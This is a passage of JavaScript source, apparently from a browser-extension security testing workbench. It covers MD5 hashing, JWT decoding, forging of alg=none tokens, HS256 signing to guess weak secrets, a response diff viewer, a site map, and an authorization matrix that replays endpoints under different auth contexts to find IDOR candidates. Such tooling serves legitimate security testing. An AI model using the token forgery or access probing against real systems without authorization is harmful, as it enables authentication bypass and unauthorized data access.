    function f(x, y, z) { return (x & y) | (~x & z); }
    function g(x, y, z) { return (x & z) | (y & ~z); }
    function h(x, y, z) { return x ^ y ^ z; }
    function i(x, y, z) { return y ^ (x | ~z); }
    function step(fn, a, b, c, d, m, k, sh) { return add(L(add(add(a, fn(b, c, d)), add(m, k)), sh), b); }
    const bytes = new TextEncoder().encode(s);
    const len = bytes.length;
    const padded = new Uint8Array(((len + 8) >> 6) * 64 + 64);
    padded.set(bytes);
    padded[len] = 0x80;
    const dv = new DataView(padded.buffer);
    dv.setUint32(padded.length - 8, len * 8, true);
    let a = 0x67452301, b = 0xefcdab89, c = 0x98badcfe, d = 0x10325476;
    const k = [0xd76aa478,0xe8c7b756,0x242070db,0xc1bdceee,0xf57c0faf,0x4787c62a,0xa8304613,0xfd469501,0x698098d8,0x8b44f7af,0xffff5bb1,0x895cd7be,0x6b901122,0xfd987193,0xa679438e,0x49b40821,0xf61e2562,0xc040b340,0x265e5a51,0xe9b6c7aa,0xd62f105d,0x02441453,0xd8a1e681,0xe7d3fbc8,0x21e1cde6,0xc33707d6,0xf4d50d87,0x455a14ed,0xa9e3e905,0xfcefa3f8,0x676f02d9,0x8d2a4c8a,0xfffa3942,0x8771f681,0x6d9d6122,0xfde5380c,0xa4beea44,0x4bdecfa9,0xf6bb4b60,0xbebfbc70,0x289b7ec6,0xeaa127fa,0xd4ef3085,0x04881d05,0xd9d4d039,0xe6db99e5,0x1fa27cf8,0xc4ac5665,0xf4292244,0x432aff97,0xab9423a7,0xfc93a039,0x655b59c3,0x8f0ccc92,0xffeff47d,0x85845dd1,0x6fa87e4f,0xfe2ce6e0,0xa3014314,0x4e0811a1,0xf7537e82,0xbd3af235,0x2ad7d2bb,0xeb86d391];
    const sh = [7,12,17,22,7,12,17,22,7,12,17,22,7,12,17,22,5,9,14,20,5,9,14,20,5,9,14,20,5,9,14,20,4,11,16,23,4,11,16,23,4,11,16,23,4,11,16,23,6,10,15,21,6,10,15,21,6,10,15,21,6,10,15,21];
    for (let off = 0; off < padded.length; off += 64) {
      const m = [];
      for (let j = 0; j < 16; j++) m.push(dv.getUint32(off + j * 4, true));
      let aa = a, bb = b, cc = c, dd = d;
      for (let j = 0; j < 64; j++) {
        const fn = j < 16 ? f : j < 32 ? g : j < 48 ? h : i;
        const mi = j < 16 ? j : j < 32 ? (5*j+1)%16 : j < 48 ? (3*j+5)%16 : (7*j)%16;
        const t = step(fn, aa, bb, cc, dd, m[mi], k[j], sh[j]);
        aa = dd; dd = cc; cc = bb; bb = t;
      }
      a = add(a, aa); b = add(b, bb); c = add(c, cc); d = add(d, dd);
    }
    function tohex(x) { let r = ''; for (let j = 0; j < 4; j++) r += ((x >>> (j * 8)) & 0xff).toString(16).padStart(2, '0'); return r; }
    return tohex(a) + tohex(b) + tohex(c) + tohex(d);
  },

  // JWT — decode and forge. Forge alg=none is the classic JWT auth bypass test.
  // Forge HS256 lets the user try common weak secrets as a guess.
  jwtDecode() {
    const tok = $('jwtInput').value.trim();
    const parts = tok.split('.');
    if (parts.length < 2) { toast('Not a JWT'); return; }
    function b64urlDecode(s) {
      let p = s.replace(/-/g, '+').replace(/_/g, '/');
      while (p.length % 4) p += '=';
      try { return decodeURIComponent(escape(atob(p))); } catch (e) { return '(decode error)'; }
    }
    try {
      const h = JSON.parse(b64urlDecode(parts[0]));
      const p = JSON.parse(b64urlDecode(parts[1]));
      $('jwtHeader').value = JSON.stringify(h, null, 2);
      $('jwtPayload').value = JSON.stringify(p, null, 2);
      toast('Decoded');
    } catch (e) {
      toast('Decode failed: ' + e.message);
    }
  },

  jwtForgeNone() {
    let h, p;
    try {
      h = $('jwtHeader').value ? JSON.parse($('jwtHeader').value) : { alg: 'none', typ: 'JWT' };
      p = $('jwtPayload').value ? JSON.parse($('jwtPayload').value) : {};
    } catch (e) { toast('Invalid JSON: ' + e.message); return; }
    h.alg = 'none';
    function b64urlEncode(s) {
      return btoa(unescape(encodeURIComponent(s))).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    }
    const tok = b64urlEncode(JSON.stringify(h)) + '.' + b64urlEncode(JSON.stringify(p)) + '.';
    $('jwtOutput').value = tok;
    toast('Forged alg=none token');
  },

  async jwtSignHs256() {
    let h, p;
    try {
      h = $('jwtHeader').value ? JSON.parse($('jwtHeader').value) : { alg: 'HS256', typ: 'JWT' };
      p = $('jwtPayload').value ? JSON.parse($('jwtPayload').value) : {};
    } catch (e) { toast('Invalid JSON: ' + e.message); return; }
    h.alg = 'HS256';
    h.typ = h.typ || 'JWT';
    const secret = $('jwtSecret').value || '';
    if (!secret) { toast('Provide a secret'); return; }
    function b64urlEncode(s) {
      const bytes = typeof s === 'string' ? new TextEncoder().encode(s) : s;
      let bin = '';
      for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
      return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
    }
    const headerEnc = b64urlEncode(JSON.stringify(h));
    const payloadEnc = b64urlEncode(JSON.stringify(p));
    const signingInput = headerEnc + '.' + payloadEnc;
    const key = await crypto.subtle.importKey(
      'raw', new TextEncoder().encode(secret),
      { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']
    );
    const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(signingInput));
    const sigEnc = b64urlEncode(new Uint8Array(sig));
    $('jwtOutput').value = signingInput + '.' + sigEnc;
    toast('Signed with HS256');
  },
};

// -------------------------------------------------------------------
// DIFF VIEWER
// -------------------------------------------------------------------
const DiffView = {
  init() {
    $('diffCompute').addEventListener('click', () => this.compute());
    $('diffSwap').addEventListener('click', () => {
      const l = $('diffLeft').value; $('diffLeft').value = $('diffRight').value; $('diffRight').value = l;
      const lb = $('diffLeftBadge').textContent; $('diffLeftBadge').textContent = $('diffRightBadge').textContent; $('diffRightBadge').textContent = lb;
    });
    $('diffClear').addEventListener('click', () => {
      $('diffLeft').value = ''; $('diffRight').value = '';
      $('diffLeftBadge').textContent = ''; $('diffRightBadge').textContent = '';
      $('diffResult').style.maxHeight = '0';
      $('diffOut').innerHTML = '';
    });
  },

  // Line-level diff using LCS. For body-size text, character-level diff would be too
  // noisy — line diff is what hunters actually want for "is this response different?"
  compute() {
    const A = ($('diffLeft').value || '').split('\n');
    const B = ($('diffRight').value || '').split('\n');
    if (!A.length && !B.length) { toast('Paste responses first'); return; }
    const ops = this.lcsDiff(A, B);
    let html = '';
    let added = 0, removed = 0, same = 0;
    ops.forEach(op => {
      if (op.kind === 'eq') {
        same++;
        html += `<span class="diff-eq">${esc(op.line)}\n</span>`;
      } else if (op.kind === 'add') {
        added++;
        html += `<span class="diff-add">+ ${esc(op.line)}\n</span>`;
      } else if (op.kind === 'del') {
        removed++;
        html += `<span class="diff-del">- ${esc(op.line)}\n</span>`;
      }
    });
    $('diffOut').innerHTML = html;
    $('diffSummary').textContent = `+${added} −${removed} =${same}`;
    $('diffResult').style.maxHeight = '60vh';
  },

  // Standard LCS-based diff. O(N×M) but capped at 5000 lines per side to keep snappy.
  lcsDiff(A, B) {
    const cap = 5000;
    if (A.length > cap) A = A.slice(0, cap);
    if (B.length > cap) B = B.slice(0, cap);
    const m = A.length, n = B.length;
    const dp = Array.from({ length: m + 1 }, () => new Int32Array(n + 1));
    for (let i = m - 1; i >= 0; i--) {
      for (let j = n - 1; j >= 0; j--) {
        dp[i][j] = A[i] === B[j] ? dp[i + 1][j + 1] + 1 : Math.max(dp[i + 1][j], dp[i][j + 1]);
      }
    }
    const ops = [];
    let i = 0, j = 0;
    while (i < m && j < n) {
      if (A[i] === B[j]) { ops.push({ kind: 'eq', line: A[i] }); i++; j++; }
      else if (dp[i + 1][j] >= dp[i][j + 1]) { ops.push({ kind: 'del', line: A[i] }); i++; }
      else { ops.push({ kind: 'add', line: B[j] }); j++; }
    }
    while (i < m) { ops.push({ kind: 'del', line: A[i++] }); }
    while (j < n) { ops.push({ kind: 'add', line: B[j++] }); }
    return ops;
  },
};

// -------------------------------------------------------------------
// SITE MAP
// -------------------------------------------------------------------
const SiteMap = {
  init() { /* nothing to wire upfront */ },

  render() {
    const tree = $('sitemapTree');
    const eps = (TAB_DATA && TAB_DATA.endpoints) || [];
    if (!eps.length) {
      tree.innerHTML = `
        <div class="empty-state">
          <div class="empty-state-i">⌥</div>
          <div class="empty-state-t">No endpoints yet</div>
          <div class="empty-state-s">Browse the target site (or click <strong>Scan</strong> in the popup) to populate the site map. Endpoints are organized by host and path.</div>
        </div>`;
      return;
    }
    // Group by host, then sort alphabetically by path
    const byHost = {};
    eps.forEach(e => {
      const host = e.host || (function() { try { return new URL(e.url).hostname; } catch (_) { return '(unknown)'; } })();
      if (!byHost[host]) byHost[host] = {};
      const path = e.path || '/';
      const key = path;
      if (!byHost[host][key]) byHost[host][key] = { path, methods: new Set(), statuses: new Set(), entries: [] };
      byHost[host][key].methods.add(e.method || 'GET');
      if (e.status) byHost[host][key].statuses.add(e.status);
      byHost[host][key].entries.push(e);
    });
    let html = '';
    Object.keys(byHost).sort().forEach(host => {
      const paths = byHost[host];
      const sorted = Object.keys(paths).sort();
      html += `<div class="sitemap-host">
        <div class="sitemap-host-name">${esc(host)} <span style="font-size:10px;color:var(--t3);font-weight:400;font-family:var(--mono)">${sorted.length} paths</span></div>`;
      sorted.forEach(p => {
        const node = paths[p];
        const methodPills = [...node.methods].map(m => `<span class="rail-method m-${escA(m)}">${esc(m)}</span>`).join('');
        const codePills = [...node.statuses].slice(0, 4).map(s => `<span class="sitemap-code-pill ${statusClass(s)}" style="background:${statusBg(s)}">${s}</span>`).join('');
        html += `<div class="sitemap-row" data-url="${escA(node.entries[0].url || '')}" data-method="${escA([...node.methods][0] || 'GET')}">
          ${methodPills}
          <span class="sitemap-path">${esc(p)}</span>
          <span class="sitemap-codes">${codePills}</span>
          <span style="color:var(--t3);font-size:9px">→</span>
        </div>`;
      });
      html += `</div>`;
    });
    tree.innerHTML = html;
    tree.querySelectorAll('.sitemap-row').forEach(row => {
      row.addEventListener('click', () => {
        Repeater.loadFromEndpoint({
          url: row.dataset.url,
          method: row.dataset.method,
          label: 'Site Map',
        });
      });
    });
  },
};
function statusBg(s) {
  if (!s) return 'var(--info-bg)';
  if (s < 300) return 'rgba(58,255,138,.08)';
  if (s < 400) return 'rgba(255,197,58,.08)';
  if (s < 500) return 'rgba(255,123,58,.08)';
  return 'rgba(255,58,92,.08)';
}

// -------------------------------------------------------------------
// AUTH CONTEXTS + AUTHORIZATION MATRIX
// -------------------------------------------------------------------
const AuthCtx = {
  current: null,  // currently editing context

  init() {
    $('authNewBtn').addEventListener('click', () => this.newCtx());
    $('authSave').addEventListener('click', () => this.save());
    $('authActivate').addEventListener('click', () => this.activate());
    $('authDelete').addEventListener('click', () => this.del());
    $('authMatrixRun').addEventListener('click', () => this.runMatrix());
  },

  render() {
    // Default Anonymous if list is empty
    if (!AUTH_CTX.list || !AUTH_CTX.list.length) {
      AUTH_CTX = AUTH_CTX || { active: 'Anonymous', list: [] };
      AUTH_CTX.list = [{ name: 'Anonymous', cookies: {}, headers: {}, notes: 'No auth — baseline for IDOR/BAC comparison' }];
    }
    const list = $('authList');
    list.innerHTML = '';
    AUTH_CTX.list.forEach(c => {
      const isActive = c.name === AUTH_CTX.active;
      const isCurrent = this.current && this.current.name === c.name;
      const card = el('div', { class: 'auth-card' + (isCurrent ? ' active' : '') });
      card.innerHTML = `
        <div class="auth-card-head">
          <span class="auth-card-name">${esc(c.name)}</span>
          ${isActive ? '<span class="badge" style="color:var(--purple);background:rgba(155,90,255,.15)">ACTIVE</span>' : ''}
        </div>
        <div class="auth-card-meta">
          ${Object.keys(c.cookies || {}).length} cookies · ${Object.keys(c.headers || {}).length} headers
        </div>
        ${c.notes ? `<div class="auth-card-meta" style="margin-top:4px;color:var(--t2)">${esc(c.notes)}</div>` : ''}`;
      card.addEventListener('click', () => {
        this.current = c;
        this.renderEdit();
        this.render();
      });
      list.appendChild(card);
    });
    if (!this.current) this.current = AUTH_CTX.list[0];
    this.renderEdit();
  },

  renderEdit() {
    if (!this.current) return;
    $('authName').value = this.current.name || '';
    $('authCookies').value = buildCookieBlock(this.current.cookies || {});
    $('authHeaders').value = buildHeaderBlock(this.current.headers || {});
    $('authNotes').value = this.current.notes || '';
  },

  newCtx() {
    const c = { name: 'New context ' + (AUTH_CTX.list.length + 1), cookies: {}, headers: {}, notes: '' };
    AUTH_CTX.list.push(c);
    this.current = c;
    this.persist();
    this.render();
  },

  save() {
    if (!this.current) return;
    const oldName = this.current.name;
    this.current.name = $('authName').value.trim() || oldName;
    this.current.cookies = parseCookieBlock($('authCookies').value);
    this.current.headers = parseHeaderBlock($('authHeaders').value);
    this.current.notes = $('authNotes').value.trim();
    if (AUTH_CTX.active === oldName) AUTH_CTX.active = this.current.name;
    this.persist();
    this.render();
    updateCtxIndicator();
    toast('Saved');
  },

  activate() {
    if (!this.current) return;
    AUTH_CTX.active = this.current.name;
    this.persist();
    this.render();
    updateCtxIndicator();
    toast('Activated: ' + this.current.name);
  },

  del() {
    if (!this.current) return;
    if (this.current.name === 'Anonymous') { toast("Can't delete Anonymous"); return; }
    if (!confirm('Delete context "' + this.current.name + '"?')) return;
    AUTH_CTX.list = AUTH_CTX.list.filter(c => c !== this.current);
    if (AUTH_CTX.active === this.current.name) AUTH_CTX.active = 'Anonymous';
    this.current = AUTH_CTX.list[0];
    this.persist();
    this.render();
    updateCtxIndicator();
  },

  persist() {
    chrome.runtime.sendMessage({ action: 'wbAuthSave', tabId: SOURCE_TAB_ID, auth: AUTH_CTX }, () => {});
  },

  // Run the authorization matrix: every endpoint × every context. Color cells by status.
  // Differences across rows scream IDOR/BAC.
  async runMatrix() {
    if (!TAB_DATA || !TAB_DATA.endpoints || !TAB_DATA.endpoints.length) {
      toast('No endpoints captured yet'); return;
    }
    if (AUTH_CTX.list.length < 2) {
      toast('Need at least 2 contexts (Anonymous + one more)'); return;
    }
    // Pick up to 30 unique paths to keep latency reasonable
    const seen = new Set();
    const targets = [];
    for (const e of TAB_DATA.endpoints) {
      const key = (e.method || 'GET') + ' ' + (e.path || e.url);
      if (seen.has(key)) continue;
      seen.add(key);
      targets.push(e);
      if (targets.length >= 30) break;
    }

    $('authMatrixView').style.display = '';
    $('authEdit').style.display = 'none';
    const view = $('authMatrixView');
    view.innerHTML = `<div class="auth-matrix">
      <div style="margin-bottom:10px;font-size:11px;color:var(--t2)">Probing ${targets.length} endpoints across ${AUTH_CTX.list.length} contexts...</div>
      <div id="matrixProgress" style="font-family:var(--mono);font-size:10px;color:var(--t3)">0/${targets.length * AUTH_CTX.list.length}</div>
    </div>`;

    const grid = {};  // grid[endpointKey][ctxName] = {status, size}
    let done = 0;
    const total = targets.length * AUTH_CTX.list.length;
    for (const ep of targets) {
      const epKey = (ep.method || 'GET') + ' ' + (ep.path || ep.url);
      grid[epKey] = {};
      for (const ctx of AUTH_CTX.list) {
        const resp = await sendRequest({
          method: ep.method || 'GET',
          url: ep.url || ep.path,
          headers: {},
          body: '',
          ctxName: ctx.name,
        });
        grid[epKey][ctx.name] = { status: resp.status || 0, size: resp.size || 0 };
        done++;
        $('matrixProgress').textContent = `${done}/${total}`;
      }
    }
    this.renderMatrixResults(grid, targets);
  },

  renderMatrixResults(grid, targets) {
    const view = $('authMatrixView');
    let html = `<div class="auth-matrix">
      <div style="display:flex;align-items:center;margin-bottom:10px">
        <h2 style="font-size:13px;color:var(--t1);font-weight:700">Authorization matrix</h2>
        <span style="margin-left:10px;font-size:10px;color:var(--t3)">${targets.length} endpoints × ${AUTH_CTX.list.length} contexts</span>
        <span style="flex:1"></span>
        <button class="btn" id="matrixBack">← Back to edit</button>
      </div>
      <div style="font-size:10px;color:var(--t3);margin-bottom:8px">
        Differences across columns = IDOR/BAC candidates.
        <span style="color:var(--green)">Green</span> = 2xx,
        <span style="color:var(--yellow)">yellow</span> = 3xx,
        <span style="color:var(--orange)">orange</span> = 4xx,
        <span style="color:var(--red)">red</span> = 5xx.
        Anomaly icon ★ when contexts return different status codes.
      </div>
      <table class="matrix-table">
        <thead><tr><th>Endpoint</th>${AUTH_CTX.list.map(c => `<th>${esc(c.name)}</th>`).join('')}<th>Δ</th></tr></thead>
        <tbody>`;
    targets.forEach(ep => {
      const epKey = (ep.method || 'GET') + ' ' + (ep.path || ep.url);
      const row = grid[epKey] || {};
      const statuses = AUTH_CTX.list.map(c => (row[c.name] || {}).status || 0);
      const distinct = new Set(statuses).size;
      const anomaly = distinct > 1;
      html += `<tr style="${anomaly ? 'background:rgba(255,197,58,.04)' : ''}">
        <td style="font-family:var(--mono);font-size:10px;color:var(--t1);max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">
          <span class="rail-method m-${escA(ep.method || 'GET')}">${esc(ep.method || 'GET')}</span>
          ${esc(ep.path || ep.url || '')}
        </td>`;
      AUTH_CTX.list.forEach(c => {
        const cell = row[c.name] || {};
        html += `<td><span class="matrix-cell ${statusClass(cell.status)}" style="background:${statusBg(cell.status)}">${cell.status || '—'}</span></td>`;
      });
      html += `<td>${anomaly ? '<span style="color:var(--yellow)">★</span>' : ''}</td>
      </tr>`;
    });
    html += `</tbody></table></div>`;
    view.innerHTML = html;
    document.getElementById('matrixBack').addEventListener('click', () => {
      $('authMatrixView').style.display = 'none';
      $('authEdit').style.display = '';
    });
  },
};
